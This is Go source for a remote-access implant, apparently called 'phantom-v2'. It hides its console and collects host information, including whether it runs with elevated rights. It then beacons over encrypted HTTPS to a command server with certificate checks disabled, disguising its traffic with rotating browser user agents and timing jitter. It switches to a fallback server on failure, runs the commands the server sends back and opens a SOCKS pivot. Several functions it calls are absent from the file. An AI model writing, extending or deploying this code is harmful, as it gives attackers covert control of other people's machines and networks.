package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	serverURL     = "https://127.0.0.1:8443"
	fallbackURL   = ""
	pskHex        = ""
	defaultSleep  = "3"
	defaultJitter = "20"
	startDelay    = "0"
)

var (
	key       []byte
	client    *http.Client
	sessionID atomic.Value // string
	aad       = []byte("phantom-v2")
)

var (
	mu        sync.Mutex
	curSleep  = 3
	curJitter = 20
)

var socksOnce sync.Once

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
}

var userAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

func getTiming() (int, int) { mu.Lock(); defer mu.Unlock(); return curSleep, curJitter }
func setTiming(s, j int)    { mu.Lock(); curSleep = s; curJitter = j; mu.Unlock() }

func sid() string {
	v, _ := sessionID.Load().(string)
	return v
}

func setSid(s string) { sessionID.Store(s) }

type HostInfo struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	User     string `json:"user"`
	Arch     string `json:"arch"`
	IP       string `json:"ip"`
	PID      int    `json:"pid"`
	Cwd      string `json:"cwd"`
	Kernel   string `json:"kernel"`
	Elevated bool   `json:"elevated"`
}

type Cmd struct {
	ID   string                 `json:"id"`
	Type string                 `json:"type"`
	Args map[string]interface{} `json:"args"`
}

type BeaconResp struct {
	SessionID string `json:"session_id"`
	Sleep     int    `json:"sleep"`
	Jitter    int    `json:"jitter"`
	Commands  []Cmd  `json:"commands"`
}

type Result struct {
	CmdID string `json:"cmd_id"`
	OK    bool   `json:"ok"`
	Out   string `json:"out"`
	Err   string `json:"err"`
}

func main() {
	hideConsole()

	key, _ = hex.DecodeString(pskHex)
	if len(key) != 32 {
		key = []byte("0123456789abcdef0123456789abcdef")
	}
	serverURL = strings.TrimRight(serverURL, "/")
	fallbackURL = strings.TrimRight(fallbackURL, "/")

	if n, err := strconv.Atoi(defaultSleep); err == nil && n > 0 {
		curSleep = n
	}
	if n, err := strconv.Atoi(defaultJitter); err == nil {
		curJitter = n
	}
	if n, err := strconv.Atoi(startDelay); err == nil && n > 0 {
		time.Sleep(time.Duration(n) * time.Second)
	}
	if i, err := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents)))); err == nil {
		userAgent = userAgents[int(i.Int64())%len(userAgents)]
	}

	client = &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    8,
		},
	}

	host := gatherHost()
	pending := []Result{}
	fails := 0

	for {
		req := BeaconReq{SessionID: sid(), Host: host, Results: pending}
		pending = nil

		br, err := doBeacon(req)
		if err != nil {
			fails++
			if fails == 5 && fallbackURL != "" {
				serverURL, fallbackURL = fallbackURL, serverURL
				fails = 0
			}
			time.Sleep(5 * time.Second)
			continue
		}
		fails = 0
		setSid(br.SessionID)

		// the SOCKS pivot rides the same beacon channel
		socksOnce.Do(func() { go startSocks() })

		if len(br.Commands) > 0 {
			for _, c := range br.Commands {
				pending = append(pending, execute(c))
			}
			continue
		}
		s, j := getTiming()
		time.Sleep(time.Duration(s+randJitter(s, j)) * time.Second)
	}
}

func doBeacon(req BeaconReq) (BeaconResp, error) {
	var br BeaconResp
	body, _ := json.Marshal(req)
	raw, err := post("/beacon", seal(body))
	if err != nil {
		return br, err
	}
	plain, err := open(raw)
	if err != nil {
		return br, err
	}
	return br, json.Unmarshal(plain, &br)
}

func seal(plain []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	return append(nonce, gcm.Seal(nil, nonce, plain, aad)...)
}

func open(blob []byte) ([]byte, error) {
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(blob) < ns {
		return nil, fmt.Errorf("short")
	}
	return gcm.Open(nil, blob[:ns], blob[ns:], aad)
}

func post(path string, body []byte) ([]byte, error) {
	req, _ := http.NewRequest("POST", serverURL+path, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

type BeaconReq struct {
	SessionID string   `json:"session_id"`
	Host      HostInfo `json:"host"`
	Results   []Result `json:"results"`
}

func primaryIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, ifc := range ifaces {
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := ifc.Addrs()
		for _, a := range addrs {
			if ipn, ok := a.(*net.IPNet); ok {
				if v4 := ipn.IP.To4(); v4 != nil {
					return v4.String()
				}
			}
		}
	}
	return ""
}

func isElevated() bool {
	if runtime.GOOS == "windows" {
		out, err := newCmd("net", "session").Output()
		return err == nil && len(out) > 0
	}
	return os.Getuid() == 0
}

func gatherHost() HostInfo {
	h, _ := os.Hostname()
	u, _ := user.Current()
	cwd, _ := os.Getwd()
	kr := ""
	if runtime.GOOS == "linux" {
		if out, err := newCmd("uname", "-r").Output(); err == nil {
			kr = strings.TrimSpace(string(out))
		}
	}
	uname := "?"
	if u != nil {
		uname = u.Username
	}
	return HostInfo{
		Hostname: h, OS: runtime.GOOS + "/" + runtime.GOARCH,
		User: uname, Arch: runtime.GOARCH, IP: primaryIP(),
		PID: os.Getpid(), Cwd: cwd, Kernel: kr, Elevated: isElevated(),
	}
}

func randJitter(sleep, pct int) int {
	if pct <= 0 {
		return 0
	}
	max := sleep * pct / 100
	if max < 1 {
		max = 1
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max+1)))
	return int(n.Int64())
}

func str(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func atoi(v interface{}, def int) int {
	n, err := strconv.Atoi(str(v))
	if err != nil {
		return def
	}
	return n
}

